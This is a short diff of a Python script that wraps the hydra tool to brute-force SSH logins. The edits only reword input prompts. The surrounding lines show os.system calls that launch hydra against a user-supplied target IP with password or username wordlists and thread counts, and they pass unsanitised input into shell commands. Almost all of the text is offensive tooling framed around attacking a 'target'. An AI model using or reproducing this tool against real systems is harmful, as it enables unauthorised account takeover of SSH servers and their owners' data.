@@ -43,7 +43,7 @@ while True:
    while True:
     choice = input("\033[0mAnswer: ")
     if choice == "1":
-     passwd_list = input(f"Enter Your Targets Password OR Type 'show' to locate the wordlist: ")
+     passwd_list = input(f"Enter Your Target Password List, OR Type 'show' to locate the wordlist: ")
      if passwd_list == "show":
       check = input(f"Enter Your .txt Name: {LIGHT_GREEN}")
       os.system(f"locate {check}")
@@ -53,7 +53,7 @@ while True:
       threads = input(f"Enter The Amount of Threads: ")
       os.system(f'hydra -l {username} -P {passwd_list} -t {threads} ssh://{host_ip}')
     elif choice == "2":
-     passwd = input(f"Enter Your Target Username OR Type 'show' to locate the wordlist: ")
+     passwd = input(f"Enter Your Target Username List, OR Type 'show' to locate the wordlist: ")
      if passwd == "show":
       check = input(f"Enter Your .txt Name: {LIGHT_GREEN} ")
       os.system(f"locate {check}")
@@ -63,7 +63,7 @@ while True:
       threads = input(f"Enter The Amount of Threads: ")
       os.system(f'hydra -L {username_list} -p {passwd} -t {threads} ssh://{host_ip}')
     elif choice == "3":
-     pass_list = input(f"Enter Your Password list OR Type 'show' to locate the wordlist: ")
+     pass_list = input(f"Enter Your Target Password List, OR Type 'show' to locate the wordlist: ")
      if pass_list == "show":
       check = input(f"Enter Your .txt Name: {LIGHT_GREEN}")
       os.system(f"locate {check}")
